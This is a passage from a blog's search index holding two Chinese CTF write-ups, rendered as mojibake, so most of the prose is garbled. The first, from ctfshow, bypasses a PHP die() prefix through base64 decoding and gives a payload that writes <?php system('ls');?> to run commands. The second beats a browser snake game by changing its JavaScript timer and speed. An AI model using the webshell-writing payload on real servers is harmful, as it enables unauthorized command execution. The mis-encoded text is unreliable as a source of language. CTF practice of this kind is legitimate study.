<h2 id="ç»•è¿‡æ­»äº¡"><a href="#ç»•è¿‡æ­»äº¡" class="headerlink" title="ç»•è¿‡æ­»äº¡"></a>ç»•è¿‡æ­»äº¡</h2><p>å‰é¢æåˆ°ä¼šä»¥base64è§£ç çš„å½¢å¼å†™å…¥ï¼Œä»‹ç»ä¸€ä¸‹base64è§£ç çš„è¿‡ç¨‹</p>
<p>1.ç­›é€‰å­—ç¬¦ï¼ŒæŠŠä¸å±äº65ä¸ªbase64å­—ç¬¦å»æ‰</p>
<p>2.è§£ç ï¼Œæ¯å››ä¸ªbase64å­—ç¬¦ä¸ºä¸€ç»„è§£ç </p>
<p>æˆ‘ä»¬è¿™æ ·æ¥æ“ä½œä¸€ä¸‹<?php die('å¤§ä½¬åˆ«ç§€äº†');?></p>
<p>ç¬¬ä¸€æ­¥å‰©ä¸‹phpdie</p>
<p>ç¬¬äºŒæ­¥ï¼Œç”±äºåªæœ‰6ä¸ªå­—ç¬¦ï¼Œè§£ç å¤±è´¥ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ‰‹åŠ¨æ·»åŠ ä¸¤ä¸ªå­—ç¬¦ï¼Œç»™å®ƒä¹±è§£å³å¯ï¼Œåæ­£æœ€åæ‰§è¡Œæˆ‘ä»¬çš„phpä»£ç å³å¯</p>
<p>æ‰€ä»¥payload:<code>content=aaPD9waHAgc3lzdGVtKCdscycpOzs/Pg==</code>aaæ˜¯è‡ªå·±åŠ çš„ï¼Œåé¢çš„æ˜¯<?php system('ls');?></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240316180606776.png"  alt="image-20240316180606776"></p>
<p>æœ€åå†åˆ‡æ¢å‘½ä»¤æŸ¥çœ‹flagå³å¯</p>
<h1 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240316194352222.png"  alt="image-20240316194352222"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240316194408379.png"  alt="image-20240316194408379"></p>
]]></content>
      <categories>
        <category>å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>å­¦ä¹ </tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°å½•ä¸€é¢˜å¥½ç©çš„æ¸¸æˆé¢˜</title>
    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
    <content><![CDATA[<h1 id="æˆ‘ç»™äº”æ˜Ÿ"><a href="#æˆ‘ç»™äº”æ˜Ÿ" class="headerlink" title="æˆ‘ç»™äº”æ˜Ÿ"></a>æˆ‘ç»™äº”æ˜Ÿ</h1><span id="more"></span>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
<p>éœ€è¦æˆ‘ä»¬æ§åˆ¶å°è›‡ç”Ÿå­˜60sï¼Œç©ç©çœ‹</p>
<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQå½•å±20240509205907 (1)"></p>
<p>ç©ä¸ªè›‹ï¼Œç»™ä»–60sä¼°è®¡éƒ½èƒ½é£ä¸Šæœˆçƒäº†</p>
<p>æˆ‘ä»¬æ‰“å¼€æ§åˆ¶å°çœ‹æºç </p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
<h1 id="é«˜æ•ˆè§£æ³•"><a href="#é«˜æ•ˆè§£æ³•" class="headerlink" title="é«˜æ•ˆè§£æ³•"></a>é«˜æ•ˆè§£æ³•</h1><p>å¯ä»¥çœ‹åˆ°ä¸€åˆ‡éƒ½æ˜¯ä»newä¸€ä¸ªsnakeå¼€å§‹çš„ï¼Œæ³¨æ„åˆ°timeCounterè®¡æ—¶å™¨ï¼Œäºæ˜¯æˆ‘ä»¬åœ¨æ§åˆ¶å°newä¸€ä¸ªæ–°çš„snakeå†ä¿®æ”¹è®¡æ—¶å™¨æ—¶é—´å³å¯</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
<p>æˆåŠŸå‡ºç°flag</p>
<h1 id="æç¬‘è§£æ³•"><a href="#æç¬‘è§£æ³•" class="headerlink" title="æç¬‘è§£æ³•"></a>æç¬‘è§£æ³•</h1><h2 id="ä¿®æ”¹åœ°å›¾å¤§å°"><a href="#ä¿®æ”¹åœ°å›¾å¤§å°" class="headerlink" title="ä¿®æ”¹åœ°å›¾å¤§å°"></a>ä¿®æ”¹åœ°å›¾å¤§å°</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
<p>çœ‹çœ‹æ•ˆæœ</p>
<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQå½•å±20240509211757"></p>
<p>å¯ä»¥çœ‹åˆ°æ’å¢™äº†æ²¡æœ‰æ­»ï¼Œè¯´æ˜åœ°å›¾ç¡®å®å¤§äº†ï¼Œç„¶åå’±ä»¬ç­‰ä»–è·‘ä¸ª60så°±å¥½</p>
<h2 id="æ”¹å˜å°è›‡é€Ÿåº¦"><a href="#æ”¹å˜å°è›‡é€Ÿåº¦" class="headerlink" title="æ”¹å˜å°è›‡é€Ÿåº¦"></a>æ”¹å˜å°è›‡é€Ÿåº¦</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQå½•å±20240509213044"></p>
<p>å› ä¸ºå°è›‡é€Ÿåº¦ä¼šåŠ å¿«ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è®¾ç½®ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ¯0.5ç§’é‡æ–°è®¾ç½®ä¸€æ¬¡é€Ÿåº¦å°±å¥½äº†</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…å¹²è„†ç›´æ¥æŠŠspeedè®¾ç½®ä¸º0ï¼Œè¿™æ ·å°è›‡å°±ä¼šåƒbotä¸€æ ·åœ¨åŸåœ°ä¸åŠ¨äº†</p>
<p>å˜»å˜»</p>
]]></content>
      <tags>
        <tag>-ctf</tag>
      </tags>
  </entry>
</search>
